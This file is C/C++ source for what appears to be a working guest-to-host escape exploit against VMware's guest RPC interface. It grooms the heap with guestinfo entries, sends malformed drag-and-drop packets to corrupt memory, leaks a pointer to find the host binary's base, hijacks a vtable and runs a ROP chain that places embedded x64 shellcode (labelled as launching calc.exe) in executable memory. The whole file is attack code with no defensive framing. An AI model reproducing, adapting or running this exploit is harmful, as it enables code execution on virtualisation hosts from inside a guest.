#include <Winsock2.h>
#include <windows.h>
#include <stdio.h>
#include "backdoor_def.h"
#include "message.h"
//#include "rpcout.h"

#pragma comment(lib,"Ws2_32.lib")


#define GUEST_RPC_CMD_STR_DND "dnd.transport "
#define RPCI_PROTOCOL_NUM       0x49435052 /* 'RPCI' ;-) */
//#define GUEST_RPC_CMD_STR_CP  "copypaste.transport "

// call calc.exe (winx64)
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
"\x63\x2e\x65\x78\x65\x00";

typedef
#pragma pack(push, 1)
struct DnDTransportPacketHeader {
	uint32 type;
	uint32 seqNum;
	uint32 totalSize;
	uint32 payloadSize;
	uint32 offset;
	uint8 payload[1];
}
#pragma pack(pop)
DnDTransportPacketHeader;

typedef
#pragma pack(push, 1)
struct winchunk {
	uint32 type;
	uint32 unknow;
	uint32 windowid;
	uint32 chunkid;
	uint32 payloadSize;
	char payload[8];
}
#pragma pack(pop)
winchunk;

unsigned int GlobalChunkid = 0;
typedef enum
{
	DND_TRANSPORT_PACKET_TYPE_UNKNOWN = 0,
	DND_TRANSPORT_PACKET_TYPE_SINGLE,
	DND_TRANSPORT_PACKET_TYPE_REQUEST,
	DND_TRANSPORT_PACKET_TYPE_PAYLOAD,
} DND_TRANSPORT_PACKET_TYPE;


#define DND_TRANSPORT_PACKET_HEADER_SIZE      (5 * sizeof(uint32))

typedef enum TransportInterfaceType {
	TRANSPORT_HOST_CONTROLLER_DND = 0,
	TRANSPORT_HOST_CONTROLLER_CP,
	TRANSPORT_HOST_CONTROLLER_FT,
	TRANSPORT_GUEST_CONTROLLER_DND,
	TRANSPORT_GUEST_CONTROLLER_CP,
	TRANSPORT_GUEST_CONTROLLER_FT,
	TRANSPORT_INTERFACE_MAX,
} TransportInterfaceType;

Message_Channel msgchl;

BOOL rpcstart()
{
	return Message_OpenAllocated(RPCI_PROTOCOL_NUM, &msgchl, 0, 0);
}

Bool rpcstop()
{
	return Message_CloseAllocated(&msgchl);
}

BOOL rpcsend(char *inbuf, size_t inlen, unsigned char**outbuf, size_t *outlen)
{
	if (Message_Send(&msgchl, (const unsigned char*)inbuf, inlen) == FALSE) {
		return FALSE;
	}
	if (Message_Receive(&msgchl, outbuf, outlen) == FALSE) {

		return FALSE;
	}
	if (!*outbuf && !*outlen)
	{
		return TRUE;
	}
	if (*outlen < 2
		|| ((strncmp((const char *)*outbuf, "1 ", 2) == 0) == FALSE
		&& strncmp((const char *)outbuf, "0 ", 2))) {
		return FALSE;
	}
	*outlen -= 2;
	*outbuf += 2;
	return TRUE;
}

BOOL rpcsendstr(char *instr, unsigned char**outbuf, size_t *outlen)
{
	size_t inlen = strlen(instr);
	return rpcsend(instr, inlen, outbuf,outlen);
}
void setver4()
{
	unsigned char *myReply = 0;
	size_t myRepLen;

	if (!rpcsend("tools.capability.dnd_version 4", 31, &myReply, &myRepLen))
	{
		puts((char*)myReply);
		puts("Error1");
		return;
	}
	if (!rpcsend("tools.capability.copypaste_version 4", 37, &myReply, &myRepLen))
	{
		puts((char*)myReply);
		puts("Error2");
		return;
	}
	if (!rpcsend("vmx.capability.dnd_version", 26, &myReply, &myRepLen))
	{
		puts((char*)myReply);
		puts("Error3");
		return;
	}
	printf("Current DnD Version %s\n", myReply);
	if (!rpcsend("vmx.capability.copypaste_version", 32, &myReply, &myRepLen))
	{
		puts((char*)myReply);
		puts("Error4");
		return;
	}
	printf("Current C&P Version %s\n", myReply);
}

BOOL SendPacket(const uint8 *msg,size_t length,const char *cmd)
{
	char *rpc = NULL;
	size_t rpcSize = 0;
	unsigned char *myReply = 0;
	size_t myRepLen;
	BOOL ret = true;

	rpcSize = strlen(cmd)+ length;
	rpc = new char[rpcSize];
	strcpy_s(rpc, rpcSize,cmd);

	if (length > 0) {
		memcpy(rpc + strlen(cmd), msg, length);
	}

	ret= rpcsend(rpc, rpcSize, &myReply, &myRepLen);

	if (!ret)
	{
		puts((char*)myReply);
	}
	delete (rpc);
	return ret;
}

BOOL DnDSendPacket(char *inbuf,size_t inbuflen,uint32 seq,uint32 totalsize,uint32 offset) 
{
	DnDTransportPacketHeader *packet;
	BOOL ret=FALSE;

	packet = (DnDTransportPacketHeader *)new char[inbuflen + DND_TRANSPORT_PACKET_HEADER_SIZE];
	packet->type = DND_TRANSPORT_PACKET_TYPE_PAYLOAD;
	packet->seqNum =seq;
	packet->totalSize = totalsize;
	packet->payloadSize = inbuflen;
	packet->offset = offset;

	memcpy(packet->payload,inbuf,inbuflen);

	ret = SendPacket((uint8*)packet, inbuflen + DND_TRANSPORT_PACKET_HEADER_SIZE, GUEST_RPC_CMD_STR_DND);
	delete packet;
	return ret;
}

BOOL SetPayloadQword(char *payload)
{
	unsigned char *myReply = 0;
	size_t myRepLen, totallen = 0;
	char tmp[0x100];
	RtlSecureZeroMemory(tmp, 0x100);

	winchunk *tmpchunk = new winchunk;

	RtlSecureZeroMemory(tmpchunk, sizeof winchunk);
	tmpchunk->type = htonl(1);
	memcpy(tmpchunk->payload, payload, 8);
	tmpchunk->windowid = htonl(0xdeadbeef);
	tmpchunk->chunkid = htonl(GlobalChunkid);
	GlobalChunkid++;
	tmpchunk->unknow = 2;
	tmpchunk->payloadSize = htonl(8);

	strcpy_s(tmp, "unity.window.contents.chunk ");
	totallen = strlen(tmp);
	memcpy(tmp + totallen, tmpchunk, sizeof winchunk);
	totallen += sizeof winchunk;

	if (!rpcsend(tmp, totallen, &myReply, &myRepLen))
	{
		puts((char*)myReply);
		delete tmpchunk;
		return FALSE;
	}
	delete tmpchunk;
	return TRUE;
}

BOOL SetPayload(char *payload, size_t inlen)
{
	for (int i = 0; i < inlen;i+=8)
	{
		if (!SetPayloadQword(payload + i))
		{
			return FALSE;
		}
	}
	return TRUE;
}

BOOL SetGlobalPointer(__int64 gadget)
{
	unsigned char *myReply = 0;
	size_t myRepLen;

	u_long low = gadget & 0xffffffff, nlow = 0;
	u_long high = (gadget >> 32), nhigh = 0;;

	nlow = htonl(low);
	nhigh = htonl(high);

	char tmp[0x100];
	RtlSecureZeroMemory(tmp, 0x100);

	memcpy(tmp, "unity.window.contents.start \x00\x00\x00\x01\x00\x00\x00\x01\xde\xad\xbe\xef",40);
	memcpy(tmp + 40, &nlow, 4);
	memcpy(tmp + 44, &nhigh, 4);
	memcpy(tmp + 48, "\x00\x00\x02\x00", 4);

	if (!rpcsend(tmp, 52, &myReply, &myRepLen))
	{
		puts((char*)myReply);
		return FALSE;
	}
	return TRUE;
}
int findvuln(int totalbuf)
{
	unsigned char *myReply = 0;
	size_t myRepLen;

	for (int x = totalbuf; x; x--)
	{
		char tmp[0x100] = { 0 };

		sprintf_s(tmp, "info-get guestinfo.test%d", x);

		if (!rpcsendstr(tmp, &myReply, &myRepLen))
		{
			puts((char*)myReply);
			puts("Error8");
			return -1;
		}

		if (strchr((char*)myReply, 'e'))
		{
		//	printf("buffer first 8 bytes:%x,%x,%x,%x,%x,%x,%x,%x\n", myReply[0], myReply[1], myReply[2], myReply[3], myReply[4], myReply[5], myReply[6], myReply[7]);
			return x;
		}
	}
	return -1;
}

void main(int argc,char**argv)
{
	__try {
		unsigned char *myReply=0;
		size_t myRepLen;
// 		puts("wait 5s...");
// 		Sleep(5000);
		if (rpcstart())
		{
			puts("Setting current DnD version to 3...");
			if (!rpcsend("tools.capability.dnd_version 3",31,&myReply,&myRepLen))
			{
				puts((char*)myReply);
				puts("Error1");
				__leave;
			}
			if (!rpcsend("tools.capability.copypaste_version 3", 37, &myReply, &myRepLen))
			{
				puts((char*)myReply);
				puts("Error2");
				__leave;
			}
			puts("Creating some buffer...");

			for (int x = 0; x < 128;x++)
			{
				char tmp[0x100] = { 0 };
				char ttmp[0xa8] = { 0 };
				size_t tmplen = 0;
				memset(ttmp, '1', 0xa0);

				sprintf_s(tmp, "info-set guestinfo.test%d ", x);
				tmplen = strlen(tmp);
				memcpy(tmp + tmplen, ttmp, 0xa0);
				tmplen += 0x9f;

				if (!rpcsend(tmp, tmplen, &myReply, &myRepLen))
				{
					puts((char*)myReply);
					puts("Error5");
					__leave;
				}

			}

			for (int x = 128; x < 256; x++)
			{
				char tmp[0x100] = { 0 };
				char ttmp[0xa8] = { 0 };
				size_t tmplen = 0;
				memset(ttmp, '2', 0x90);

				sprintf_s(tmp, "info-set guestinfo.test%d ", x);
				tmplen = strlen(tmp);
				memcpy(tmp + tmplen, ttmp, 0x90);
				tmplen += 0x8f;

				if (!rpcsend(tmp, tmplen, &myReply, &myRepLen))
				{
					puts((char*)myReply);
					puts("Error6");
					__leave;
				}
			}

			for (int x = 256; x < 265; x++)
			{
				char tmp[0x100] = { 0 };
				char ttmp[0xa8] = { 0 };
				size_t tmplen = 0;
				memset(ttmp, '3', 0xa8);

				sprintf_s(tmp, "info-set guestinfo.test%d ", x);
				tmplen = strlen(tmp);
				memcpy(tmp + tmplen, ttmp, 0xa8);
				tmplen += 0xa7;

				if (!rpcsend(tmp, tmplen, &myReply, &myRepLen))
				{
					puts((char*)myReply);
					puts("Error7");
					__leave;
				}
			}
			if (!rpcsend("vmx.capability.dnd_version", 26, &myReply, &myRepLen))
			{
				puts((char*)myReply);
				puts("Error3");
				__leave;
			}
			printf("Current DnD Version %s\n", myReply);
			if (!rpcsend("vmx.capability.copypaste_version", 32, &myReply, &myRepLen))
			{
				puts((char*)myReply);
				puts("Error4");
				__leave;
			}
			printf("Current C&P Version %s\n", myReply);

			puts("Creating vuln buffer...");

			char testbuf[0xb0] = { 0 };

			int currentpos = 0;

			lstrcpyA(testbuf, "This is a test2");
			memset(testbuf + strlen(testbuf), 't', 0x60 - strlen(testbuf));
			DnDSendPacket(testbuf, 0x60, 0x41414141, 0xa8, currentpos);

			currentpos += 0x60;

			for (int x = 265; x < 300; x++)
			{
				char tmp[0x100] = { 0 };
				char ttmp[0xa8] = { 0 };
				size_t tmplen = 0;
				memset(ttmp, '4', 0xa8);

				sprintf_s(tmp, "info-set guestinfo.test%d ", x);
				tmplen = strlen(tmp);
				memcpy(tmp + tmplen, ttmp, 0xa8);
				tmplen += 0xa7;

				if (!rpcsend(tmp, tmplen, &myReply, &myRepLen))
				{
					puts((char*)myReply);
					puts("Error7");
					__leave;
				}
			}

			RtlSecureZeroMemory(testbuf, 0xb0);
			lstrcpyA(testbuf, "exploit test buffer");
			
			memset(testbuf + strlen(testbuf), 'e', 0x58 - strlen(testbuf));
			DnDSendPacket(testbuf, 0x58, 0x41414141, 0x200, currentpos);
			currentpos += 0x58;

			int failtime = 0,vulnid=-1;

			while (failtime<50)
			{
				vulnid = findvuln(299);

				if (vulnid == -1)
				{
					failtime++;
					printf("Fail to find target buffer...try %d\n", failtime);
					memset(testbuf, 'e', 0xb0);
					DnDSendPacket(testbuf, 0xb0, 0x41414141, 0x1000+currentpos, currentpos);
					currentpos += 0xb0;
				}
				else
				{
					printf("Got vuln buffer %d\n", vulnid);
					break;
				}
			}

			if (vulnid==-1)
			{
				puts("Vuln buffer not found!");
			}
			else
			{
				// got vuln buffer 
				// go leak!
				DnDSendPacket(testbuf, 0xa8, 0x41414141, 0x1000, currentpos);
				currentpos += 0xa8;

				failtime = 0;
				uint64 obj=0;

				char tmp[0x100] = { 0 };
				sprintf_s(tmp, "info-get guestinfo.test%d", vulnid);

				RtlSecureZeroMemory(testbuf, 0xb0);
				memset(testbuf, '5', 0xb0);

				while (failtime<50)
				{

					if (!rpcsendstr(tmp, &myReply, &myRepLen))
					{
						puts((char*)myReply);
						puts("Error9");
					}
			//		printf("Try %d,last 8 bytes:%x,%x,%x,%x,%x,%x,%x,%x\n", failtime, myReply[myRepLen], myReply[myRepLen - 1], myReply[myRepLen - 2], myReply[myRepLen - 3], myReply[myRepLen - 4], myReply[myRepLen - 5], myReply[myRepLen - 6], myReply[myRepLen - 7]);
					char *leak = (char*)memchr((void*)myReply, '\x7f',myRepLen);
					if (leak)
					{
						// found a leak.
						memcpy(&obj, leak -5, 6);
						printf("Got leaked pointer 0x%llx\n", obj);
						break;
					}
					else
					{
						failtime++;
					}
					DnDSendPacket(testbuf, 0xb0, 0x41414141, 0x1000 + currentpos, currentpos);
					currentpos += 0xb0;
				}

				if (obj)
				{
					// overwrite vtable
					char payload[0x300];
					RtlSecureZeroMemory(payload, 0x300);

					uint64 baseaddr = 0, tmp = obj & 0xfff, gadget = 0;

					//printf("%llx\n", tmp);
					if (tmp==0x5d0) //CnP
					{
						baseaddr = obj - 0x7a75d0;
						printf("Got base addr :0x%llx\n", baseaddr);
						gadget = baseaddr + 0x33700;
						uint64 pGadget = baseaddr + 0xb87100, gadget2 = baseaddr + 0x41dc2;
						uint64 *ppayload = (uint64*)payload;
						memcpy(payload, &pGadget, 8);
						// rop here..!
						uint64 rwxmem = baseaddr + 0x00b309a0;
						ppayload[1] = baseaddr + 0x4d7b20; // add rsp,0xa0;pop;ret
						ppayload += 23;
						*ppayload++ = baseaddr + 0x061553;//pop rcx
						*ppayload++ = rwxmem;
						*ppayload++ = baseaddr + 0x129b9b; //mov eax, esp ; add rsp, 0x20 ; pop r12 ; ret
						ppayload += 5;
						*ppayload++ = baseaddr + 0x61e2cd; //add rax, 0x34 ; ret
						*ppayload++ = baseaddr + 0x61e2cd; //add rax, 0x34 ; ret
						*ppayload++ = baseaddr + 0x033d72;//pop r8
						*ppayload++ = 0x200;
						*ppayload++ = baseaddr + 0x562e90;// mov edx, eax ; cmp edx, 0x11 ; je 0x140562ea3 ; xor al, al ; ret
						*ppayload++ = baseaddr + 0x14e5b;//pop rax
						*ppayload++ = baseaddr + 0x75e358;//memcpy
						*ppayload++ = baseaddr + 0x0fd823; //mov rax, qword ptr [rax] ; ret
						*ppayload++ = baseaddr + 0x08ded; //jmp rax
						*ppayload++ = rwxmem + 0x10;
						memcpy((char*)ppayload, shellcode, sizeof shellcode);
						memcpy(payload + 0xa0, &gadget2, 8);

						if (!SetGlobalPointer(gadget))
						{
							puts("Error11");
							__leave;
						}
					}
					else if (tmp==0x880) //DnD
					{
						baseaddr = obj - 0x7a7880;
						printf("Got base addr :0x%llx\n", baseaddr);
						gadget = baseaddr + 0x33700;
						__int64 Stackpiovt_Gadget = baseaddr + 0x11b2d, p2payload = baseaddr + 0xb87118;
						uint64 *ppayload = (uint64*)payload;

						char tmpbuffer[0x18] = { 0 };

						memcpy(tmpbuffer + 0x10, &Stackpiovt_Gadget, 8);

						if (!SetGlobalPointer(gadget))
						{
							puts("Error11");
							__leave;
						}

						if (!SetPayload(tmpbuffer, 0x18))
						{
							puts("Error12");
							__leave;
						}
						
						memcpy(payload + 0x38, &p2payload, 8);

						uint64 rwxmem = baseaddr + 0x00b309a0;
						ppayload += 9;
						*ppayload++ = baseaddr + 0x061553;//pop rcx
						*ppayload++ = rwxmem;
						*ppayload++ = baseaddr + 0x53d4a8; //mov eax, esp ; add rsp, 0x30 ; pop r12 ; ret
						ppayload += 7;
						*ppayload++ = baseaddr + 0x61e2cd; //add rax, 0x34 ; ret
						*ppayload++ = baseaddr + 0x61e2cd; //add rax, 0x34 ; ret
						*ppayload++ = baseaddr + 0x033d72;//pop r8
						*ppayload++ = 0x200;
						*ppayload++ = baseaddr + 0x562e90;// mov edx, eax ; cmp edx, 0x11 ; je 0x140562ea3 ; xor al, al ; ret
						*ppayload++ = baseaddr + 0x14e5b;//pop rax
						*ppayload++ = baseaddr + 0x75e358;//memcpy
						*ppayload++ = baseaddr + 0x0fd823; //mov rax, qword ptr [rax] ; ret
						*ppayload++ = baseaddr + 0x08ded; //jmp rax
						*ppayload++ = rwxmem + 0x20;
						memcpy((char*)ppayload, shellcode, sizeof shellcode);
					}
					else
					{
						puts("Error in leak");
						__leave;
					}
					
					
					DnDSendPacket(payload, 0x300, 0x41414141, 0x1000 + currentpos, currentpos);
					currentpos += 0x300;

				}
			}

			puts("Done!");
			setver4();
		}
		else
		{
			puts("RPC Start Error!");
		}
	}
	__except (GetExceptionInformation() ?
	EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
		fprintf(stderr, "Not vm error");
	}
}